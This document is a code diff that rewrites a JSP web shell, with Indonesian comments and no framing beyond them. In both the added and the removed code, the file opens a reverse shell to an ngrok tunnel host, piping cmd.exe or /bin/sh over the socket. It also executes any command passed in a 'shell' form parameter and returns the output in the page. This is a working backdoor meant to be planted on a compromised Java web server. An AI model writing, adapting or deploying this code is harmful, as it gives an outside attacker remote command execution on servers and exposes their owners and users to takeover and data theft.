@@ -1,108 +1,83 @@
+<%@ page import="java.io.*, java.net.*, java.util.*" %>
 <%
-    /*
-     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.
-     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.
-     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing 
-     * the command specified in the HTML form). This is to avoid to keep it simple.
-     */
-%>
+    // --- Setup shell path berdasarkan OS
+    String shellPath = System.getProperty("os.name").toLowerCase().contains("win") ? "cmd.exe" : "/bin/sh";
 
-<%@page import="java.lang.*"%>
-<%@page import="java.io.*"%>
-<%@page import="java.net.*"%>
-<%@page import="java.util.*"%>
+    // --- Fungsi untuk Reverse Shell
+    class StreamConnector extends Thread {
+        InputStream is;
+        OutputStream os;
+
+        StreamConnector(InputStream is, OutputStream os) {
+            this.is = is;
+            this.os = os;
+        }
+
+        public void run() {
+            try {
+                byte[] buffer = new byte[1024];
+                int len;
+                while ((len = is.read(buffer)) != -1) {
+                    os.write(buffer, 0, len);
+                    os.flush();
+                }
+            } catch (Exception e) {
+                // Silent exception
+            } finally {
+                try { is.close(); } catch (Exception e) {}
+                try { os.close(); } catch (Exception e) {}
+            }
+        }
+    }
+
+    // --- Mencoba koneksi reverse shell
+    try {
+        String attackerIP = "0.tcp.ap.ngrok.io";
+        int attackerPort = 13914;
+        Socket socket = new Socket(attackerIP, attackerPort);
+        Process process = new ProcessBuilder(shellPath).redirectErrorStream(true).start();
+
+        (new StreamConnector(process.getInputStream(), socket.getOutputStream())).start();
+        (new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();
+
+        out.println("[+] Reverse shell connected to " + attackerIP + ":" + attackerPort + "<br>");
+    } catch (Exception e) {
+        out.println("[-] Reverse shell failed: " + e.getMessage() + "<br>");
+    }
+
+    // --- Web-based shell fallback
+    String command = request.getParameter("shell");
+    if (command != null && !command.trim().equals("")) {
+        out.println("<b>Command:</b> " + command + "<br><pre>");
+        try {
+            Process process;
+            if (shellPath.equals("cmd.exe")) {
+                process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", command});
+            } else {
+                process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", command});
+            }
+
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            String line;
+            while ((line = reader.readLine()) != null) {
+                out.println(line + "\n");
+            }
+            reader.close();
+        } catch (Exception e) {
+            out.println("Error executing command: " + e.getMessage());
+        }
+        out.println("</pre>");
+    }
+%>
 
 <html>
 <head>
-    <title>jrshell</title>
+    <title>JSP Shell</title>
 </head>
 <body>
-<form METHOD="POST" NAME="myform" ACTION="">
-    <input TYPE="text" NAME="shell">
-    <input TYPE="submit" VALUE="Send">
-</form>
-<pre>
-<%
-
-    // Define the OS
-    String shellPath = null;
-    try
-    {
-        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
-            shellPath = new String("/bin/sh");
-        } else {
-            shellPath = new String("cmd.exe");
-        }
-    } catch( Exception e ){}
-
-
-    // INNER HTML PART
-    if (request.getParameter("shell") != null) {
-        out.println("Command: " + request.getParameter("shell") + "\n<BR>");
-        Process p;
-
-        if (shellPath.equals("cmd.exe"))
-            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));
-        else
-            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));
-
-        OutputStream os = p.getOutputStream();
-        InputStream in = p.getInputStream();
-        DataInputStream dis = new DataInputStream(in);
-        String disr = dis.readLine();
-        while ( disr != null ) {
-            out.println(disr);
-            disr = dis.readLine();
-        }
-    }
-
-    // TCP PORT PART
-    class StreamConnector extends Thread
-    {
-        InputStream wz;
-        OutputStream yr;
-
-        StreamConnector( InputStream wz, OutputStream yr ) {
-            this.wz = wz;
-            this.yr = yr;
-        }
-
-        public void run()
-        {
-            BufferedReader r  = null;
-            BufferedWriter w = null;
-            try
-            {
-                r  = new BufferedReader(new InputStreamReader(wz));
-                w = new BufferedWriter(new OutputStreamWriter(yr));
-                char buffer[] = new char[8192];
-                int length;
-                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
-                {
-                    w.write( buffer, 0, length );
-                    w.flush();
-                }
-            } catch( Exception e ){}
-            try
-            {
-                if( r != null )
-                    r.close();
-                if( w != null )
-                    w.close();
-            } catch( Exception e ){}
-        }
-    }
- 
-    try {
-        Socket socket = new Socket( "0.tcp.ap.ngrok.io", 16167 ); // Replace with wanted ip and port
-        Process process = Runtime.getRuntime().exec( shellPath );
-        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
-        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
-        out.println("port opened on " + socket);
-     } catch( Exception e ) {}
-
-
-%>
-</pre>
+    <form method="POST">
+        <input type="text" name="shell" placeholder="Type command here" style="width:300px;">
+        <input type="submit" value="Execute">
+    </form>
 </body>
 </html>
